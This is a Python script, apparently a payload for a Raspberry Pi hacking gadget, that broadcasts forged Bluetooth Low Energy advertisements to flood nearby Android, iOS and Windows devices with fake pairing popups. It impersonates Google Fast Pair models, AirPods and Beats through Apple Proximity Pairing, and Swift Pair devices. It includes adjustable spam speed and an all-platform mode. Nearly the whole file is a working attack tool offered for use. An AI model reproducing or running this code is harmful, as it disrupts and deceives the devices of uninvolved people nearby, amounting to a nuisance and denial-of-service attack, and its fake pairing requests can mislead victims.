#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE Spam (iOS / Android / Windows)
========================================================
Author: 7h30th3r0n3

Broadcast crafted BLE advertisements to trigger popup notifications
on nearby devices.

Setup / Prerequisites:
  - Requires Bluetooth adapter (hci0).
  - Targets: iOS (Apple Proximity), Android (Google FastPair),
    Windows (Swift Pair).

Supported popup types:
  - FastPair (Android): "Device found nearby" popups
  - Proximity Pairing (iOS): fake AirPods/Beats pairing requests
  - Swift Pair (Windows): Bluetooth device pairing popups

Uses hcitool/hciconfig on hci0.

Controls:
  OK        -- Start / stop spam
  KEY1      -- Cycle mode (FastPair / iOS / Windows / ALL)
  UP / DOWN -- Adjust broadcast speed
  KEY3      -- Exit
"""

import os
import sys
import time
import random
import struct
import threading
import subprocess

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
HCI_DEV = "hci0"
MODES = ["FastPair", "iOS", "Windows", "ALL"]
SPEED_LEVELS = [200, 150, 100, 75, 50]  # ms between broadcasts
SPEED_LABELS = ["Slow", "Med", "Fast", "Vfast", "Max"]

# Google Fast Pair model IDs (various headphones/speakers)
FASTPAIR_MODELS = [
    b"\x00\x00\x01", b"\x00\x00\x02", b"\x00\x00\x03",
    b"\x00\x00\x04", b"\x00\x00\x05", b"\x00\x00\x06",
    b"\x00\x00\x07", b"\x00\x00\x08", b"\x00\x00\x09",
    b"\x00\x00\x0A", b"\x00\x00\x0B", b"\x00\x00\x0C",
    b"\x2C\xDE\xAD", b"\xAA\xBB\xCC", b"\x11\x22\x33",
    b"\xDD\xEE\xFF", b"\x12\x34\x56", b"\x78\x9A\xBC",
]

# Apple device model bytes for Proximity Pairing
# (type 0x07 = proximity pairing, various device models)
APPLE_DEVICES = [
    (b"\x01\x01\x20", "AirPods"),
    (b"\x01\x02\x20", "AirPods Pro"),
    (b"\x01\x03\x20", "AirPods Max"),
    (b"\x01\x04\x20", "AirPods 3"),
    (b"\x01\x05\x20", "Beats Fit Pro"),
    (b"\x01\x06\x20", "Beats Solo"),
    (b"\x01\x07\x20", "Beats Studio"),
    (b"\x01\x08\x20", "PowerBeats"),
    (b"\x01\x09\x20", "Beats X"),
    (b"\x01\x0A\x20", "AirPods Pro 2"),
    (b"\x03\x01\x20", "AirTag"),
    (b"\x05\x01\x20", "HomePod"),
    (b"\x06\x01\x20", "AppleTV"),
    (b"\x0A\x01\x20", "AirPods 4"),
    (b"\x0B\x01\x20", "Beats Solo 4"),
    (b"\x0C\x01\x20", "Beats Pill"),
]

# Microsoft Swift Pair device names
SWIFT_PAIR_NAMES = [
    "Speaker", "Keyboard", "Mouse", "Headset",
    "Earbuds", "Gamepad", "Display", "Printer",
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
spamming = False
mode_idx = 0
speed_idx = 2       # default: Fast (100ms)
packets_sent = 0
last_error = ""
last_device = ""


# ---------------------------------------------------------------------------
# HCI helpers
# ---------------------------------------------------------------------------

def _hci_up():
    """Bring hci0 up."""
    subprocess.run(
        ["sudo", "hciconfig", HCI_DEV, "up"],
        capture_output=True, timeout=5,
    )


def _hci_set_adv_data(hex_bytes):
    """Set advertising data via hcitool cmd."""
    length = f"{len(hex_bytes):02X}"
    hex_str = " ".join(f"{b:02X}" for b in hex_bytes)
    cmd = (
        f"sudo hcitool -i {HCI_DEV} cmd 0x08 0x0008 "
        f"{length} {hex_str}"
    )
    return subprocess.run(
        cmd.split(), capture_output=True, text=True, timeout=5,
    )


def _hci_enable_adv():
    """Enable LE advertising."""
    subprocess.run(
        ["sudo", "hcitool", "-i", HCI_DEV, "cmd", "0x08", "0x000a", "01"],
        capture_output=True, timeout=5,
    )


def _hci_disable_adv():
    """Disable LE advertising."""
    subprocess.run(
        ["sudo", "hcitool", "-i", HCI_DEV, "cmd", "0x08", "0x000a", "00"],
        capture_output=True, timeout=5,
    )


def _hci_set_adv_params():
    """Set advertising parameters for non-connectable undirected."""
    # Min interval=0x00A0 (100ms), Max=0x00A0, type=3 (non-conn),
    # own addr=0, peer addr type=0, peer=00:00:00:00:00:00,
    # channel map=7, filter=0
    subprocess.run(
        [
            "sudo", "hcitool", "-i", HCI_DEV, "cmd",
            "0x08", "0x0006",
            "A0", "00",   # min interval
            "A0", "00",   # max interval
            "03",         # adv type: non-connectable
            "00",         # own address type
            "00",         # peer address type
            "00", "00", "00", "00", "00", "00",  # peer address
            "07",         # channel map (all)
            "00",         # filter policy
        ],
        capture_output=True, timeout=5,
    )


def _broadcast_once(adv_bytes, label):
    """Set advertising data, enable, brief pause, disable."""
    global packets_sent, last_error, last_device

    try:
        _hci_disable_adv()
        result = _hci_set_adv_data(adv_bytes)
        if result.returncode != 0:
            with lock:
                last_error = (result.stderr or "hci err")[:30]
            return False
        _hci_enable_adv()
        with lock:
            packets_sent += 1
            last_device = label
        return True
    except subprocess.TimeoutExpired:
        with lock:
            last_error = "Timeout"
        return False
    except Exception as exc:
        with lock:
            last_error = str(exc)[:30]
        return False


# ---------------------------------------------------------------------------
# Advertisement builders
# ---------------------------------------------------------------------------

def _build_fastpair_adv():
    """Build Google Fast Pair advertisement data."""
    model = random.choice(FASTPAIR_MODELS)
    # Flags + Service Data with UUID 0xFE2C
    adv = bytearray([
        0x02, 0x01, 0x06,          # Flags: LE General + BR/EDR not supported
        0x06, 0x16,                 # Length=6, Type=Service Data
        0x2C, 0xFE,                 # UUID 0xFE2C (little-endian)
    ])
    adv.extend(model)
    label = f"FP:{model.hex()}"
    return bytes(adv), label


def _build_ios_adv():
    """Build Apple Proximity Pairing advertisement."""
    device_bytes, name = random.choice(APPLE_DEVICES)
    status = random.randint(0x00, 0xFF)
    # Flags + Manufacturer Specific Data (Apple 0x004C)
    adv = bytearray([
        0x02, 0x01, 0x06,          # Flags
        0x07, 0xFF,                 # Length, Type=Manufacturer Specific
        0x4C, 0x00,                 # Apple Company ID (little-endian)
        0x07,                       # Type: Proximity Pairing
        status,                     # Status byte
    ])
    adv.extend(device_bytes)
    return bytes(adv), name


def _build_swiftpair_adv():
    """Build Microsoft Swift Pair advertisement."""
    name = random.choice(SWIFT_PAIR_NAMES)
    rssi = random.randint(0xC0, 0xFF)  # RSSI byte
    # Flags + Manufacturer Specific Data (Microsoft 0x0006)
    name_bytes = name.encode("utf-8")[:8]
    data_len = 4 + len(name_bytes)
    adv = bytearray([
        0x02, 0x01, 0x06,          # Flags
        data_len, 0xFF,             # Length, Type=Manufacturer Specific
        0x06, 0x00,                 # Microsoft Company ID (little-endian)
        0x03,                       # Scenario: Swift Pair
        rssi,                       # RSSI pathlos
    ])
    adv.extend(name_bytes)
    return bytes(adv), f"SP:{name}"


# ---------------------------------------------------------------------------
# Spam thread
# ---------------------------------------------------------------------------

def _spam_loop():
    """Main spam loop: cycle through device advertisements."""
    while True:
        with lock:
            if not spamming:
                break
            current_mode = MODES[mode_idx]
            delay_ms = SPEED_LEVELS[speed_idx]

        builders = []
        if current_mode in ("FastPair", "ALL"):
            builders.append(_build_fastpair_adv)
        if current_mode in ("iOS", "ALL"):
            builders.append(_build_ios_adv)
        if current_mode in ("Windows", "ALL"):
            builders.append(_build_swiftpair_adv)

        if not builders:
            time.sleep(0.1)
            continue

        builder = random.choice(builders)
        adv_bytes, label = builder()
        _broadcast_once(adv_bytes, label)

        time.sleep(delay_ms / 1000.0)


def _start_spam():
    """Start spamming in a background thread."""
    global spamming
    with lock:
        if spamming:
            return
        spamming = True
    _hci_up()
    _hci_set_adv_params()
    threading.Thread(target=_spam_loop, daemon=True).start()


def _stop_spam():
    """Stop spamming and disable advertising."""
    global spamming
    with lock:
        spamming = False
    time.sleep(0.2)
    try:
        _hci_disable_adv()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "BLE SPAM", font=font, fill="#FF00FF")
    with lock:
        active = spamming
    indicator = "#00FF00" if active else "#FF0000"
    d.ellipse((118, 3, 122, 7), fill=indicator)

    with lock:
        mode = MODES[mode_idx]
        spd_idx = speed_idx
        sent = packets_sent
        err = last_error
        dev = last_device

    # Mode
    y = 18
    mode_colors = {
        "FastPair": "#4CAF50",
        "iOS": "#2196F3",
        "Windows": "#FF9800",
        "ALL": "#FF00FF",
    }
    d.text((2, y), f"Mode: {mode}", font=font, fill=mode_colors.get(mode, "#FFF"))
    y += 14

    # Speed
    d.text((2, y), f"Speed: {SPEED_LABELS[spd_idx]} ({SPEED_LEVELS[spd_idx]}ms)",
           font=font, fill="#888")
    y += 14

    # Packets
    d.text((2, y), f"Packets: {sent}", font=font, fill="#00FF00")
    y += 14

    # Last device
    if dev:
        d.text((2, y), f"Last: {dev[:20]}", font=font, fill="#CCCCCC")
    y += 14

    # Error
    if err:
        d.text((2, y), f"Err: {err[:20]}", font=font, fill="#FF4444")

    # Mode description
    y = 94
    descriptions = {
        "FastPair": "Android popups",
        "iOS": "AirPods/Beats fake",
        "Windows": "Swift Pair popups",
        "ALL": "All platforms",
    }
    d.text((2, y), descriptions.get(mode, ""), font=font, fill="#555")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    label = "OK:Stop" if active else "OK:Start"
    d.text((2, 117), f"{label} K1:Mode K3:X", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global mode_idx, speed_idx

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 10), "BLE SPAM", font=font, fill="#FF00FF")
    d.text((4, 28), "Popup generator for:", font=font, fill="#888")
    d.text((8, 42), "Android (FastPair)", font=font, fill="#4CAF50")
    d.text((8, 54), "iOS (Proximity)", font=font, fill="#2196F3")
    d.text((8, 66), "Windows (SwiftPair)", font=font, fill="#FF9800")
    d.text((4, 84), "OK=Start  K1=Mode", font=font, fill="#666")
    d.text((4, 96), "UP/DN=Speed K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.5)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            if btn == "OK":
                with lock:
                    active = spamming
                if active:
                    _stop_spam()
                else:
                    _start_spam()
                time.sleep(0.3)

            elif btn == "KEY1":
                with lock:
                    mode_idx = (mode_idx + 1) % len(MODES)
                time.sleep(0.25)

            elif btn == "UP":
                with lock:
                    speed_idx = max(0, speed_idx - 1)
                time.sleep(0.2)

            elif btn == "DOWN":
                with lock:
                    speed_idx = min(len(SPEED_LEVELS) - 1, speed_idx + 1)
                time.sleep(0.2)

            _draw_screen()
            time.sleep(0.05)

    finally:
        _stop_spam()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
